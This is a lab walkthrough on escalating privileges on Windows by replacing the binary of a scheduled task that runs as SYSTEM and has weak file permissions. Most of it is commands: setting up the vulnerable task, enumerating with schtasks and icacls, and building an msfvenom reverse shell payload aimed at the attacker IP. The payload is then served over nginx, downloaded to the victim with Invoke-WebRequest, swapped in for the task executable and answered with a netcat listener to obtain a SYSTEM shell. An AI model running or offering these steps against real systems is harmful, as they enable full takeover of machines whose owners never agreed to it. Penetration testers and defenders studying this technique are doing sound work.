## a
Schedule Task Windows Privilege Escalation

1. Introduction to Windows Task Scheduler
Windows Task Scheduler is a built-in service that allows users to automate the execution of tasks at specified times or upon certain triggers. Administrators commonly use this feature for system maintenance, but attackers can also exploit it for persistence and privilege escalation.
An adversary can manipulate scheduled tasks to execute malicious code with elevated privileges. This attack vector is particularly useful when a task is configured to run with SYSTEM privileges but its executable is writable by a low-privileged user.
2. Abusing Scheduled Tasks for Privilege Escalation
By identifying a scheduled task that executes as SYSTEM, an attacker with write permissions to its executable can replace it with a malicious payload. The next time the task runs, the payload executes with SYSTEM privileges, providing full control over the compromised machine.
The attack process follows these steps:
Identify a scheduled task running with SYSTEM privileges.
Check if the current user has write or modify permissions on the task's executable file.
Replace the executable with a malicious payload.
Wait for the task to run and gain a SYSTEM shell.
3. Setting Up the Lab Environment
For this demonstration, we set up a Windows 10 victim machine and a Kali Linux attacker machine.
Attacker: Kali Linux (192.168.100.10) running Metasploit Framework
Victim: Windows 10 (192.168.1.11) with a scheduled task
Creating the Scheduled Task for demo
Create C:\Custom Tasks\Backup\Test.exe	
Run the following PowerShell script as an administrator on the victim machine:
$Action = New-ScheduledTaskAction -Execute "C:\Custom Tasks\Backup\Test.exe"

$Trigger1 = New-ScheduledTaskTrigger -AtLogOn
$Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Hours 24)

$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$Task = New-ScheduledTask -Action $Action -Trigger $Trigger1, $Trigger2 -Principal $Principal

Register-ScheduledTask -TaskName "BackupTaskDemo" -InputObject $Task -Force
Explanation of Each Part of the Script:
$Action → Executes the file "C:\Custom Task\Backup\Test.ext".
$Trigger1 → Activates when the user logs in.
$Trigger2 → Repeats every 5 minutes for 24 hours after initialization.
$Principal → Runs with SYSTEM privileges, without requiring a password, and executes with the highest privileges.
Register-ScheduledTask → Registers the task with the name "BackupTaskDemo".
________________________________________
✅ Deleting the Task After Completion
If you want to remove the task after 24 hours, you can use the following PowerShell command:
powershell
CopyEdit
Start-Sleep -Seconds 86400  # Wait for 24 hours
Unregister-ScheduledTask -TaskName "BackupTaskDemo" -Confirm:$false
Alternatively, you can include this in the main script for automatic removal.
________________________________________
✅ Manually Deleting the Task If Needed
If you need to delete the task immediately, use:
powershell
CopyEdit
Unregister-ScheduledTask -TaskName "BackupTaskDemo" -Confirm:$false


Before we dive into the enumeration of scheduled tasks, we need to understand our visibility as a standard user.
Unfortunately for us as the attacker, Microsoft does something pretty smart and only allows standard users to view scheduled tasks that belong to them. This means that any tasks we are interested in, such as those created by the administrator, we will not see when trying to query for them.
For example, if we use the following command with administrative permissions, we can query the scheduled task to find information about how it works:
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
 

This provides us with a lot of good information about the task. For starters, the task name is “BackupTaskDemo”. Additionally we can see that the task runs every five minutes and executes as SYSTEM.

 Let’s check if our user is any interesting groups.
net user Heaven 
 

Enumerating Folder Permissions

we can check our permissions on the folder using the built-in icacls command. 
First, we will see how we can use the icacls command to check the permissions of folder and file ACLs.
The permissions we are looking for on the Backup folder are any one of the following three permissions:
(F) Full Control
(M) Modify
(W) Write
The user / group permissions we are looking for are the following:
The user we are currently logged in as (%USERNAME%)
Authenticated Users
Everyone
BUILTIN\Users
NT AUTHORITY\INTERACTIVE
We want to check the permissions of both the Backup folder as well as the permissions on the executable itself. Starting with the folder since it is most likely that the file permissions will be inherited from the folder permissions. This is the default behaviour; however, there are times we can find that the folder is not writeable but the file is.
icacls "C:\Custom Tasks\Backup"

icacls "C:\Custom Tasks\Backup\Test.exe"
	 
This shows that authenticated users have the ability to Modify files in the folder. Also, we can see an (I) indicating that the permissions were inherited, as expected. We also see that the Backup folder has inherited permissions, ultimately meaning that we have Modify permissions on the Custom Tasks folder and those permissions have been inherited to all sub folders and files.

Exploiting a Scheduled Task to get a SYSTEM Shell
Now that we have found a scheduled task, we need to craft our own malware to replace the legitimate task binary.

Using Metasploit to create payload	

On Kali Linux, open a terminal and generate a malicious executable:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.10 LPORT=4444 -a x64 --platform Windows -f exe -o payload.exe
Step 3: Send Payload through Nginx Server
cd /tmp
sudo apt install nginx -y
sudo cp payload.exe /var/www/html/
sudo systemctl restart nginx
Setting Up a Listener on Kali Linux
To capture the reverse shell, the attacker sets up a Metasploit listener:
nc -nvlp 4444
Downloading the payload on Windows:

Invoke-WebRequest -Uri "http://192.168.100.10/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"

	
Lastly, we need to move our malicious version of payload.exe into the C:\Custom Tasks\Backup folder.
Replacing the Original Executable


Copy-Item -Path "C:\Windows\Temp\payload.exe" -Destination "C:\Custom Tasks\Backup\Test.exe" -Force
	
when we check our listener, we have a SYSTEM shell!


	 

